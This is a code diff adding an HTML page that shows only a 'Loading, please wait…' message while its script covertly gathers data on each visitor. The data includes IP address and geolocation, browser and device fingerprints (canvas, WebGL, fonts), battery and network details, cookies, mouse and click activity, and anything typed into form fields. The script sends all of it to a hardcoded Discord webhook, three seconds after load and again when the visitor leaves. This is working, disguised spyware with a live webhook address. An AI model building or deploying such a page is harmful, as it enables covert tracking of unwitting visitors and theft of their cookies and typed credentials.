@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Loading...</title>
+  <style>
+    body { margin: 0; background: #111; color: #eee; font-family: sans-serif;
+           display: flex; align-items: center; justify-content: center; height: 100vh; }
+    p { opacity: 0.4; font-size: 14px; }
+  </style>
+</head>
+<body>
+<p>Loading, please wait…</p>
+
+<script>
+const WEBHOOK = "https://discordapp.com/api/webhooks/1548360054049214657/Jw-eZmFL75NuRzHAib4Nwb6Y9p693Fl7uZng2UccC4GJEulG9cjFEpx4u-CI8gPV9uxh";
+
+// ── Helpers ──────────────────────────────────────────────────────────────────
+
+function getScreenInfo() {
+  return {
+    screenWidth:  screen.width,
+    screenHeight: screen.height,
+    windowWidth:  window.innerWidth,
+    windowHeight: window.innerHeight,
+    pixelRatio:   window.devicePixelRatio,
+    colorDepth:   screen.colorDepth,
+  };
+}
+
+function getBrowserInfo() {
+  return {
+    userAgent:    navigator.userAgent,
+    language:     navigator.language,
+    languages:    (navigator.languages || []).join(", "),
+    timezone:     Intl.DateTimeFormat().resolvedOptions().timeZone,
+    doNotTrack:   navigator.doNotTrack,
+    cookieEnabled:navigator.cookieEnabled,
+    onLine:       navigator.onLine,
+  };
+}
+
+function getDeviceInfo() {
+  return {
+    touchPoints:     navigator.maxTouchPoints,
+    hardwareConcurrency: navigator.hardwareConcurrency || "n/a",
+    deviceMemory:    navigator.deviceMemory        || "n/a",  // Chrome only
+    platform:        navigator.platform,
+    vendor:          navigator.vendor,
+  };
+}
+
+function getPageInfo() {
+  return {
+    href:     location.href,
+    referrer: document.referrer || "direct / none",
+    title:    document.title,
+    visitTime: new Date().toISOString(),
+  };
+}
+
+// Basic canvas fingerprint
+function canvasFingerprint() {
+  try {
+    const c = document.createElement("canvas");
+    const ctx = c.getContext("2d");
+    ctx.textBaseline = "top";
+    ctx.font = "14px 'Arial'";
+    ctx.fillStyle = "#f60";
+    ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = "#069";
+    ctx.fillText("Fingerprint💻🔍", 2, 15);
+    ctx.fillStyle = "rgba(102,204,0,0.7)";
+    ctx.fillText("Fingerprint💻🔍", 4, 17);
+    return c.toDataURL().slice(-50); // last 50 chars as short hash-like id
+  } catch(e) { return "unavailable"; }
+}
+
+// WebGL info
+function getWebGL() {
+  try {
+    const c = document.createElement("canvas");
+    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+    if (!gl) return { renderer: "n/a", vendor: "n/a" };
+    const ext = gl.getExtension("WEBGL_debug_renderer_info");
+    return {
+      renderer: ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : "masked",
+      vendor:   ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)   : "masked",
+    };
+  } catch(e) { return { renderer: "error", vendor: "error" }; }
+}
+
+// Storage / cookie test
+function getStorageInfo() {
+  try { localStorage.setItem("_t","1"); localStorage.removeItem("_t"); } catch(e) {}
+  return {
+    localStorage:  (() => { try { return typeof localStorage !== "undefined" ? "yes" : "no"; } catch(e){ return "blocked"; }})(),
+    sessionStorage:(() => { try { return typeof sessionStorage !== "undefined" ? "yes" : "no"; } catch(e){ return "blocked"; }})(),
+    cookies:       document.cookie || "(none)",
+  };
+}
+
+// Battery (where supported)
+async function getBattery() {
+  try {
+    if (!navigator.getBattery) return { supported: false };
+    const b = await navigator.getBattery();
+    return { supported: true, level: Math.round(b.level * 100) + "%", charging: b.charging };
+  } catch(e) { return { supported: false }; }
+}
+
+// Network info
+function getNetworkInfo() {
+  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if (!c) return { supported: false };
+  return {
+    supported:   true,
+    type:        c.type        || "n/a",
+    effectiveType: c.effectiveType || "n/a",
+    downlink:    c.downlink    || "n/a",
+    rtt:         c.rtt         || "n/a",
+    saveData:    c.saveData    || false,
+  };
+}
+
+// Installed fonts probe (small sample)
+function probeFonts() {
+  const testFonts = ["Arial","Courier New","Georgia","Times New Roman",
+                     "Verdana","Comic Sans MS","Impact","Trebuchet MS",
+                     "Palatino","Garamond","Bookman","Tahoma"];
+  const canvas = document.createElement("canvas");
+  const ctx = canvas.getContext("2d");
+  const base = "monospace";
+  const testStr = "mmmmmmmmmmlli";
+  ctx.font = `72px ${base}`;
+  const baseW = ctx.measureText(testStr).width;
+  return testFonts.filter(f => {
+    ctx.font = `72px '${f}', ${base}`;
+    return ctx.measureText(testStr).width !== baseW;
+  }).join(", ") || "none detected";
+}
+
+// Plugins
+function getPlugins() {
+  return Array.from(navigator.plugins || []).map(p => p.name).join(", ") || "none / hidden";
+}
+
+// Activity trackers
+let clicks = 0, scrollDepth = 0, mouseMovements = 0;
+document.addEventListener("click",     () => clicks++);
+document.addEventListener("mousemove", () => mouseMovements++);
+document.addEventListener("scroll",    () => {
+  const d = Math.round((window.scrollY / (document.body.scrollHeight - window.innerHeight)) * 100);
+  if (d > scrollDepth) scrollDepth = d;
+});
+
+// Form field snooping — captures any keystrokes in inputs
+const fieldData = {};
+document.addEventListener("input", e => {
+  if (e.target && e.target.name) fieldData[e.target.name] = e.target.value;
+});
+
+// ── Main collector ────────────────────────────────────────────────────────────
+
+async function collect() {
+  // 1. IP + geo from ip-api
+  let geo = {};
+  try {
+    const r = await fetch("https://ip-api.com/json/?fields=66846719");
+    geo = await r.json();
+  } catch(e) { geo = { error: "geo lookup failed" }; }
+
+  const battery = await getBattery();
+
+  const data = {
+    geo,
+    page:    getPageInfo(),
+    browser: getBrowserInfo(),
+    screen:  getScreenInfo(),
+    device:  getDeviceInfo(),
+    webgl:   getWebGL(),
+    network: getNetworkInfo(),
+    storage: getStorageInfo(),
+    battery,
+    plugins:  getPlugins(),
+    fonts:    probeFonts(),
+    canvasFP: canvasFingerprint(),
+    activity: { clicks, mouseMovements, scrollDepthPercent: scrollDepth + "%" },
+    formFields: fieldData,
+  };
+
+  sendToDiscord(data);
+}
+
+// ── Discord embed sender ──────────────────────────────────────────────────────
+
+function f(label, value, inline = true) {
+  return { name: label, value: String(value).slice(0, 1024) || "n/a", inline };
+}
+
+function sendToDiscord(d) {
+  const g  = d.geo;
+  const br = d.browser;
+  const sc = d.screen;
+  const dv = d.device;
+  const pg = d.page;
+  const net= d.network;
+  const bat= d.battery;
+
+  const embed = {
+    title: "🌐 New Visitor",
+    color: 0x5865F2,
+    timestamp: new Date().toISOString(),
+    fields: [
+      // IP / Geo
+      f("📡 IP",           g.query),
+      f("🏳️ Country",     `${g.country} (${g.countryCode})`),
+      f("🌍 Continent",   `${g.continent} (${g.continentCode})`),
+      f("📍 Region",       g.regionName),
+      f("🏙️ City",        g.city),
+      f("📮 ZIP",          g.zip),
+      f("🗺️ Coordinates", `${g.lat}, ${g.lon}`),
+      f("🕐 TZ (ISP)",    g.timezone),
+      f("💰 Currency",    g.currency),
+      f("📶 ISP",          g.isp),
+      f("🏢 Org",          g.org),
+      f("🔌 AS",           `${g.as} (${g.asname})`),
+      f("📱 Mobile",       g.mobile),
+      f("🛡️ Proxy",       g.proxy),
+      f("🖥️ Hosting",     g.hosting),
+
+      // Page
+      f("🔗 URL",          pg.href,    false),
+      f("↩️ Referrer",    pg.referrer, false),
+      f("⏰ Visit Time",   pg.visitTime),
+
+      // Browser
+      f("🌐 User-Agent",   br.userAgent, false),
+      f("🗣️ Language",    br.language),
+      f("🕰️ Timezone",   br.timezone),
+      f("🚫 DNT",          br.doNotTrack),
+      f("🍪 Cookies ON",  br.cookieEnabled),
+
+      // Screen
+      f("🖥️ Screen",      `${sc.screenWidth}×${sc.screenHeight}`),
+      f("🪟 Window",       `${sc.windowWidth}×${sc.windowHeight}`),
+      f("🔍 DPR",          sc.pixelRatio),
+      f("🎨 Color Depth",  sc.colorDepth),
+
+      // Device
+      f("👆 Touch pts",   dv.touchPoints),
+      f("⚙️ CPU cores",  dv.hardwareConcurrency),
+      f("💾 RAM (GB)",    dv.deviceMemory),
+      f("🖥️ Platform",   dv.platform),
+      f("🏭 Vendor",      dv.vendor),
+
+      // WebGL
+      f("🎮 GPU Renderer",d.webgl.renderer, false),
+      f("🏭 GPU Vendor",  d.webgl.vendor),
+
+      // Network
+      f("📡 Net Type",    net.supported ? net.type          : "n/a"),
+      f("⚡ Effective",   net.supported ? net.effectiveType : "n/a"),
+      f("⬇️ Downlink",   net.supported ? net.downlink      : "n/a"),
+      f("🏓 RTT",         net.supported ? net.rtt           : "n/a"),
+
+      // Battery
+      f("🔋 Battery",     bat.supported ? `${bat.level} | charging: ${bat.charging}` : "n/a"),
+
+      // Storage
+      f("💿 localStorage",d.storage.localStorage),
+      f("💿 sessionStorage",d.storage.sessionStorage),
+
+      // Fingerprint
+      f("🖱️ Canvas FP",  d.canvasFP),
+      f("🔤 Fonts",       d.fonts, false),
+      f("🔌 Plugins",     d.plugins, false),
+
+      // Activity
+      f("🖱️ Clicks",      d.activity.clicks),
+      f("🖱️ Mouse moves", d.activity.mouseMovements),
+      f("📜 Scroll depth",d.activity.scrollDepthPercent),
+
+      // Form fields (if any)
+      f("📝 Form fields", JSON.stringify(d.formFields) || "none", false),
+    ]
+  };
+
+  fetch(WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ username: "Visitor Logger", embeds: [embed] }),
+  });
+}
+
+// ── Fire after 3 s so activity counters have a moment, also send again on unload ──
+setTimeout(collect, 3000);
+window.addEventListener("beforeunload", () => {
+  // second send on leave with updated activity counts
+  collect();
+});
+</script>
+</body>
+</html>
